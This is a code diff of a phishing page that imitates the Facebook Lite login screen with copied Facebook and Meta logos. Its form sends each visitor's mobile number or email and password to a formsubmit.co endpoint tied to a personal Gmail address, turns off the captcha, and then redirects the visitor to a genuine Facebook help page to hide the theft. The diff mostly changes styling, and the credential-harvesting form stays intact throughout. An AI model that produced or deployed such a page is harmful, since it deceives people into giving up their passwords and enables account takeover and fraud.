@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en-UK">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Facebook Lite Login</title>
   <style>
     * {
@@ -13,8 +13,9 @@
 
     html, body {
       height: 100%;
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
-      background-color: #ffffff;
+      width: 100%;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background-color: #fff;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -22,41 +23,33 @@
 
     form {
       width: 100%;
-      height: 100%;
-    }
-
-    .container {
-      width: 100%;
-      height: 100%;
       max-width: 400px;
-      margin: auto;
+      padding: 24px;
       display: flex;
       flex-direction: column;
-      justify-content: center;
-      padding: 20px;
+      align-items: center;
     }
 
     .language-select {
       font-size: 14px;
       color: #1c1e21;
-      margin-bottom: 30px;
-      text-align: center;
+      margin-bottom: 24px;
     }
 
     .fb-logo {
       width: 80px;
       height: 80px;
-      border: 1px solid #ccc;
       border-radius: 50%;
+      background-color: #e4e6eb;
       display: flex;
       justify-content: center;
       align-items: center;
-      margin: 0 auto 30px;
+      margin-bottom: 24px;
     }
 
     .fb-logo img {
-      width: 40px;
-      height: 40px;
+      width: 36px;
+      height: 36px;
     }
 
     .input-box {
@@ -83,7 +76,7 @@
       color: white;
       padding: 14px;
       font-size: 16px;
-      font-weight: 600;
+      font-weight: bold;
       border: none;
       border-radius: 8px;
       cursor: pointer;
@@ -98,7 +91,7 @@
       text-align: center;
       font-size: 14px;
       color: #1877f2;
-      margin-bottom: 30px;
+      margin-bottom: 32px;
       cursor: pointer;
     }
 
@@ -106,10 +99,10 @@
       width: 100%;
       padding: 14px;
       font-size: 16px;
-      font-weight: 600;
-      border: 1px solid #1877f2;
+      font-weight: bold;
       color: #1877f2;
       background-color: transparent;
+      border: 1.5px solid #1877f2;
       border-radius: 30px;
       cursor: pointer;
       margin-bottom: 40px;
@@ -120,45 +113,44 @@
     }
 
     .meta-logo {
-      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
       color: #606770;
       font-size: 14px;
     }
 
     .meta-logo img {
       width: 50px;
-      margin-top: 5px;
+      margin-top: 4px;
     }
   </style>
 </head>
 <body>
   <form action="https://formsubmit.co/gamingznoob404@gmail.com" method="POST">
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_next" value="https://m.facebook.com/help/479793009433142/#">
+    <input type="hidden" name="_captcha" value="false" />
+    <input type="hidden" name="_next" value="https://m.facebook.com/help/479793009433142/#" />
 
-    <div class="container">
-      <div class="language-select">English (UK) &#9662;</div>
+    <div class="language-select">English (UK) &#9662;</div>
 
-      <div class="fb-logo">
-        <img src="https://i.ibb.co/Q3ccZ5fr/Facebook-Lite-logo-svg.png" alt="Facebook Lite Logo">
-      </div>
+    <div class="fb-logo">
+      <img src="https://i.ibb.co/Q3ccZ5fr/Facebook-Lite-logo-svg.png" alt="Facebook Logo" />
+    </div>
 
-      <div class="input-box">
-        <input type="text" name="mobile or email address" placeholder="Mobile number or email address" required>
-        <input type="password" name="password" placeholder="Password" required>
-      </div>
+    <div class="input-box">
+      <input type="text" name="mobile or email address" placeholder="Mobile number or email address" required />
+      <input type="password" name="password" placeholder="Password" required />
+    </div>
 
-      <button class="login-btn" type="submit">Log in</button>
+    <button class="login-btn" type="submit">Log in</button>
 
-      <div class="forgot-password">Forgotten password?</div>
+    <div class="forgot-password">Forgotten password?</div>
 
-      <button type="button" class="create-account">Create new account</button>
+    <button type="button" class="create-account">Create new account</button>
 
-      <div class="meta-logo">
-        <div>
-          <img src="https://i.ibb.co/CpZJYsVQ/facebook-meta-logo-transparent-free-png-2419520173.png" alt="Meta Logo">
-        </div>
-      </div>
+    <div class="meta-logo">
+      <img src="https://i.ibb.co/CpZJYsVQ/facebook-meta-logo-transparent-free-png-2419520173.png" alt="Meta Logo" />
+      <div>Meta</div>
     </div>
   </form>
 </body>
